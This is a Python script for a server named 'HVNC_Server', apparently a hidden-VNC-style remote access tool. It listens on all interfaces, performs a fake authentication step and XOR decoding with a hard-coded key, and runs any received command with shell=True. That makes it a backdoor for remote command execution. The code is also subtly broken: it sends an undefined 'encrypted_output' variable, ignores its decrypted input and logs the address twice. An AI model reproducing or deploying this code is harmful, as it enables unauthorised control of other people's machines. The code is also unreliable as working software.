import socket
import threading
import base64
import struct

class HVNC_Server:
    def __init__(self, host='0.0.0.0', port=5555):
        self.host = host
        self.port = port
        self.clients = []
        self.running = True
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def handle_client(self, client_socket):
        while self.running:
            try:
                # Authentication
                client_socket.send(b"AUTH\x00")
                auth_data = client_socket.recv(16)
                
                # Simple XOR-based encryption
                key = b"SECRET_KEY"
                encrypted = client_socket.recv(1024)
                decrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(encrypted)])
                
                # Command loop
                while self.running:
                    client_socket.send(b"CMD\x00")
                    command = client_socket.recv(256).decode('utf-8')
                    if not command:
                        break
                    
                    # Execute command
                    output = self.execute_command(command)
                    
                    # Send output with encryption
                    client_socket.send(b"OUTPUT\x00")
                    client_socket.send(encrypted_output)
                    
            except Exception as e:
                print(f"Error: {str(e)}")
                break

    def execute_command(self, command):
        # In a real implementation, this would be restricted
        try:
            import subprocess
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            return f"STDOUT: {result.stdout}\nSTDERR: {result.stderr}\n"
        except Exception as e:
            return f"ERROR: {str(e)}\n"

    def start(self):
        try:
            self.s.bind((self.host, self.port))
            self.s.listen(5)
            print(f"[*] Listening on {self.host}:{self.port}")
            
            while self.running:
                client, addr = self.s.accept()
                print(f"[+] Connection from {addr[0]}:{addr[0]}")
                t = threading.Thread(target=self.handle_client, args=(client,))
                t.daemon = True
                t.start()
                
        except Exception as e:
            print(f"Error: {str(e)}")
        finally:
            self.s.close()

if __name__ == "__main__":
    server = HVNC_Server()
    server.start()
